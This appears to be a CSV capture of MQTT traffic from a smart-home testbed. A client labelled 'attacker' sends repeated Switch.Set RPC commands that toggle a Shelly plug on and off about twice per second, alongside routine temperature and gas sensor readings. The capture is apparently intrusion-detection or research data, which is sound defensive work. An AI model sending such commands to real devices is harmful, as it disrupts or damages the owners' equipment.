timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T16:38:06,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:06,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5080 34419.482 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:06,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:06,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34419.48,""swi"
2026-04-22T16:38:06,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5081 34419.499 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:38:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:38:06,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:38:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:38:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:38:07,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:07,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5082 34419.977 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:07,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:07,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34419.97,""swi"
2026-04-22T16:38:07,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5083 34419.995 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:07,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:07,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5084 34420.478 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:07,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:07,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34420.48,""swi"
2026-04-22T16:38:07,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5085 34420.494 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:08,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:08,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5086 34420.978 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:08,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:08,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34420.97,""swi"
2026-04-22T16:38:08,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5087 34420.996 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:08,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:08,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5088 34421.478 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:08,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:08,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34421.48,""swi"
2026-04-22T16:38:08,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5089 34421.495 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:09,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:09,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5090 34421.979 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:09,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:09,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34421.98,""swi"
2026-04-22T16:38:09,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5091 34421.998 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:09,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:09,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5092 34422.481 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:09,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:09,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34422.48,""swi"
2026-04-22T16:38:09,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5093 34422.498 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:10,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:10,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5094 34422.980 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:10,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:10,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34422.98,""swi"
2026-04-22T16:38:10,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5095 34422.999 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:10,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:10,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5096 34423.480 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:10,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:10,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34423.48,""swi"
2026-04-22T16:38:10,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5097 34423.496 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:11,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:11,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5098 34423.981 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:11,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:11,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34423.98,""swi"
2026-04-22T16:38:11,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5099 34423.999 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:11,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:11,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5100 34424.482 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:11,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:11,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34424.48,""swi"
2026-04-22T16:38:11,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5101 34424.499 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:12,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:12,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5102 34424.984 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:12,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:12,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34424.98,""swi"
2026-04-22T16:38:12,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5103 34425.003 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:12,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:12,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5104 34425.486 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:12,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:12,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34425.48,""swi"
2026-04-22T16:38:12,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5105 34425.503 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:13,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:13,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5106 34425.986 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:13,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:13,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34425.98,""swi"
2026-04-22T16:38:13,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5107 34426.005 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:13,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:13,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5108 34426.487 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:13,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:13,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34426.48,""swi"
2026-04-22T16:38:13,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5109 34426.504 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:14,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:14,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5110 34426.988 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:14,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:14,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34426.98,""swi"
2026-04-22T16:38:14,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5111 34427.006 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:14,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:14,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5112 34427.491 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:14,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:14,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34427.49,""swi"
2026-04-22T16:38:14,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5113 34427.507 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:15,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:15,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5114 34427.989 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:15,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:15,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34427.99,""swi"
2026-04-22T16:38:15,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5115 34428.007 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:15,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:15,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5116 34428.489 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:15,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:15,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34428.49,""swi"
2026-04-22T16:38:15,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5117 34428.506 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:16,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:16,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5118 34428.990 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:16,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:16,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34428.99,""swi"
2026-04-22T16:38:16,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5119 34429.008 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:16,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:16,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5120 34429.494 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:16,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:16,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34429.49,""swi"
2026-04-22T16:38:16,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5121 34429.510 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:38:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:38:16,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:38:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:38:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:38:17,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:17,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5122 34429.991 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:17,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:17,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34429.99,""swi"
2026-04-22T16:38:17,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5123 34430.010 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:17,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:17,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5124 34430.491 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:17,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:17,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34430.49,""swi"
2026-04-22T16:38:17,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5125 34430.508 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:18,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:18,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5126 34430.992 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:18,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:18,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34430.99,""swi"
